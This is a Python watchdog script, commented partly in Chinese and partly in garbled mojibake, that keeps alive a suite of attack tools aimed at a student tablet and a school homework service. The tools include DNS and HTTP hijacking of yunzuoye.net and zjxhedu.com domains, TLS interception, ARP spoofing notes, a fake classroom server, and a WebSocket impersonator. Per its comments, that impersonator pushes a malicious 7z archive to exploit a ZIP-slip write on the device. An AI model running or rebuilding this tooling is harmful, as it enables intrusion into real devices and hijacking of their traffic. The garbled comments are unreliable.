#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""keepalive.py 鈥?閫氬淇濇椿锛堝畨鍏ㄦā寮忥級銆?
鈽?2026-10-07 00:50 閲嶈鏁欒 鈽?  鎶?DNS/HttpDNS 鍔寔鍚嶅崟鎵╁ぇ鍒?19 涓?H5 鍩熷悗, 骞虫澘鍦?00:36 鍚庡仠姝簡涓€鍒囦笟鍔℃祦閲?  (鑷 req=0 鎸佺画 20 鍒嗛挓) 鈥斺€?瀹冪殑鑱旂綉鏍￠獙鍒ゅ畾"缃戠粶涓嶅彲鐢?, 浜庢槸鎵€鏈夊簲鐢ㄥ仠鎽嗐€?  鍙﹀ arp_basket 浼氬浠绘剰鐩爣 IP 鎶㈢瓟 ARP, 涔熷彲鑳芥妸骞虫澘瀵瑰悎娉曡澶囩殑娴侀噺寮曞埌鏈満銆?  鍥炴粴涓恒€愭暣涓櫄涓婁竴鐩寸ǔ瀹氳繍琛岀殑鏈€灏忛厤缃€戝悗, 骞虫澘鍦?00:47 鎭㈠涓庣湡瀹炴湇鍔″櫒閫氫俊銆?
  鍥犳鏈枃浠跺彧淇濈暀銆愮粡杩囬獙璇併€佷笉鐮村潖骞虫澘鑱旂綉銆戠殑缁勪欢涓庡弬鏁?
    - npcap_http80: 鍙姭鎸佽嚜妫€/鏂囦欢/鏁版嵁/鎺ㄩ€佺櫥褰曡繖鍑犱釜蹇呰鍩?    - dns_hijack:   淇濇寔鏁存櫄鍦ㄨ窇鐨勫悕鍗?    - tls_relay_v2: MITM 浠?xuexiao.yunzuoye.net (mitm_sni.txt)
    - arp_basket:   涓嶈嚜鍔ㄦ媺璧?浼?ARP 鎶㈢瓟, 鏈夌牬鍧忛闄?; 闇€瑕佹椂鎵嬪伐浠?ARP_ALIAS=0 琚姩杩愯
  浠ｇ爜绾ф敼杩?TCP 鍒嗘鍙戦€併€乧loud_api 妗ラ〉闈㈡姇閫掍慨澶?鍦?npcap_http80.py / cloud_api.py 鍐呴儴, 淇濈暀鐢熸晥銆?"""
import datetime
import os
import subprocess
import sys
import time

# === PAD-AUTODETECT (patch_pad_ip.py): 按 MAC 找平板当前 IP, 免受 DHCP 换址影响 ===
_PAD_MAC = "80:20:fd:8b:4b:fa"
_pad_cache = {"ip": None, "t": 0.0}


def _p200_ip():
    import time as _t
    import subprocess as _sp
    import re as _re
    now = _t.time()
    if _pad_cache["ip"] and now - _pad_cache["t"] < 15:
        return _pad_cache["ip"]
    want = _PAD_MAC.replace(":", "-").lower()
    try:
        out = _sp.check_output(["arp", "-a"], creationflags=0x08000000).decode("utf-8", "replace")
        for line in out.splitlines():
            if want in line.lower():
                m = _re.search(r"(192\.168\.137\.\d+)", line)
                if m:
                    _pad_cache["ip"] = m.group(1)
                    _pad_cache["t"] = now
                    return m.group(1)
    except Exception:
        pass
    _pad_cache["ip"] = _pad_cache["ip"] or "192.168.137.154"
    _pad_cache["t"] = now
    return _pad_cache["ip"]
# === /PAD-AUTODETECT ===


BASE = os.path.dirname(os.path.abspath(__file__))
PY = sys.executable
LOG = os.path.join(BASE, "keepalive.log")

# 整夜验证过的最小劫持名单（勿扩大！）
SAFE_HIJACK = "www.zjxhedu.com,zjxhedu.com,filesoss.yunzuoye.net,data.yunzuoye.net,pnlogin.yunzuoye.net"
SAFE_DNS = "xuexiao.yunzuoye.net"

COMPONENTS = [
    ("npcap_http80", "npcap_http80", ["npcap_http80.py", "86400"],
     {"HTTP80_ALL_DST": "1", "HTTP80_PORTAL_RELAY": "0", "HTTP80_DNS_HIJACK": SAFE_HIJACK}),
    ("probe8099", "probe8099", ["probe8099.py"], {}),
    ("cloud_api", "cloud_api", ["cloud_api.py"], {}),
    # 鈽呪槄鈽?2026-10-07 06:55 閲嶅ぇ鍙戠幇: tls_relay_v2 浼氱牬鍧忓钩鏉?!!
    #   瀹冧互 :443 鐩戝惉骞舵妸瀹冩嫤鍒扮殑 HTTPS 杞粰**鍐欐鐨勪笂娓?* 47.110.67.143:443
    #   (鏃ュ織: [LOOP-GUARD-FALLBACK] ms.yunzuoye.net -> 47.99.85.219 鍛戒腑鏈湴鍒悕, 鏀硅蛋涓婃父 47.110.67.143
    #          [RELAY-PASS] " + _p200_ip() + " sni='ms.yunzuoye.net' -> 47.110.67.143:443)
    #   鈬?骞虫澘鐨勫叧閿帴鍙ｈ杞埌闈炲搴斿悗绔?鈬?搴旂敤鎶?璧勬簮鎴栨帴鍙ｄ笉瀛樺湪"銆?    #   缁忓鐓у疄楠岀‘璁? 鍋滄帀瀹冨簲鐢ㄧ珛鍒绘仮澶? 鑰?npcap_http80/dns_hijack 淇濈暀鏃跺簲鐢ㄤ粛姝ｅ父銆?    #   鈬?闄ら潪淇ソ"鎸夌湡瀹炵洰鐨?IP 杞彂", 鍚﹀垯涓嶅緱鎷夋椿銆傛晠姝ゅ娉ㄩ噴鎺夈€?    # 鈽呪槄鈽?2026-10-07 07:15 鍏抽敭淇: 鏈満 hosts 鍐欐浜?ms/filesoss.yunzuoye.net -> 192.168.137.1锛?    #   鑰屽钩鏉?ICS DNS 閬靛畧瀹?鈬?骞虫澘鎶婅繖浜?*涓氬姟鍩熷悕**瑙ｆ瀽鍒版湰鏈哄苟杩?443銆?    #   443 鏃犱汉鐩戝惉鏃跺簲鐢ㄨ处鍙锋帴鍙ｇ洿鎺ュけ璐?琛ㄧ幇涓?璧勬簮鎴栨帴鍙ｄ笉瀛樺湪"銆佺櫥褰曟€佽捣涓嶆潵)銆?    #   tls_passthrough.py 鐩戝惉 443, 璇?TLS ClientHello 鍙?SNI, **鎸夌湡瀹?IP 閫忎紶**(dns_public 缁曞紑 hosts),
    #   涓嶈В瀵嗕笉鏀瑰唴瀹?鈬?骞虫澘 HTTPS 鍔熻兘鎭㈠, 鎴戞柟涔熶繚鐣欎簡"鍦ㄨ矾寰勪笂"鐨勪綅缃€?    #   涓庢浘闂ジ鐨?tls_relay_v2 鐨勫尯鍒? 鍚庤€呮妸鍏ㄩ儴 HTTPS 杞粰鍐欐涓婃父 47.110.67.143 鈬?鍚庣閿欓厤銆?    ("tls_passthrough", "tls_passthrough", ["tls_passthrough.py", "12"], {}),
    ("watch_auto", "watch_auto", ["watch_auto.py"], {}),
    ("adbwatch", "adbwatch", ["adbwatch.py"], {}),
    ("push_pbs", "push_pbs", ["push_pbs.py"], {}),
    ("dns_hijack", "dns_hijack", ["dns_hijack.py", "86400"], {"DNS_HIJACK_HOSTS": SAFE_DNS}),
    ("assist_orchestrator", "assist_orchestrator", ["assist_orchestrator.py", "1440"], {}),
    ("agent_connect", "agent_connect", ["agent_connect.py", "720"], {}),
    ("fake_classroom", "fake_classroom", ["fake_classroom.py", "run"], {"OWN_IP": "192.168.137.1"}),
    # WS8889-KEEPALIVE (2026-10-10): 链路层冒充教室 WebSocket(47.99.214.197|47.99.229.40:8889)。
    # 无人值守关键组件: 平板 App 重连教室时, 本组件接管该 WS 并注入 OPEN_FTP(50001) 信封
    # => 端侧 downloadFromTeacher => 从我们 8080 取恶意 7z => Z7Extractor 解压 => ZIP-SLIP 越界写。
    ("ws8889", "ws8889", ["ws8889.py", "86400"],
     {"WS8889_ONLY_DST": "47.99.214.197,47.99.229.40"}),
    ("classroom_watch", "classroom_watch", ["classroom_watch.py", "10"], {}),
    ("night_watch", "night_watch", ["night_watch.py"], {}),
    # arp_basket 鍒绘剰涓嶅垪鍏? 瑙佹枃浠跺ご璇存槑
]


def wlog(msg):
    line = "%s %s" % (datetime.datetime.now().strftime("%H:%M:%S"), msg)
    try:
        with open(LOG, "a", encoding="utf-8", errors="replace") as f:
            f.write(line + "\n")
    except Exception:
        pass
    print(line, flush=True)


def running():
    try:
        # NOFLASH (2026-10-10): 必须 CREATE_NO_WINDOW, 否则每轮都闪一个 PowerShell 窗口
        # NOFLASH-FIX2: 同时查 python.exe 与 pythonw.exe —— 组件现在以 pythonw 运行,
        #   只查 python.exe 会误判为"未运行"从而反复重启, 产生重复实例。
        out = subprocess.run(["powershell", "-NoProfile", "-Command",
                              "Get-CimInstance Win32_Process | "
                              "Where-Object { $_.Name -eq 'python.exe' -or $_.Name -eq 'pythonw.exe' } | "
                              "ForEach-Object { $_.CommandLine }"],
                             capture_output=True, text=True, timeout=60,
                             creationflags=0x08000000)
        return out.stdout or ""
    except Exception:
        return ""


def start(name, args, env):
    path = os.path.join(BASE, args[0])
    if not os.path.exists(path):
        wlog("[keepalive] %s 鑴氭湰涓嶅瓨鍦? %s" % (name, path))
        return
    e = os.environ.copy()
    e.update(env)
    try:
        subprocess.Popen([PY, path] + args[1:], cwd=BASE, env=e,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         creationflags=0x00000008 | 0x00000200)
        wlog("[keepalive] 閲嶅惎 %s" % name)
    except Exception as ex:
        wlog("[keepalive] %s 鍚姩澶辫触: %s" % (name, ex))


def main():
    hours = float(sys.argv[1]) if len(sys.argv) > 1 else 10.0
    wlog("===== keepalive(瀹夊叏妯″紡) 鍚姩 (%.1f 灏忔椂) =====" % hours)
    t0 = time.time()
    while time.time() - t0 < hours * 3600:
        alive = running()
        for name, pat, args, env in COMPONENTS:
            if name not in alive:
                start(name, args, env)
        time.sleep(180)
    wlog("[keepalive] 缁撴潫")


if __name__ == "__main__":
    main()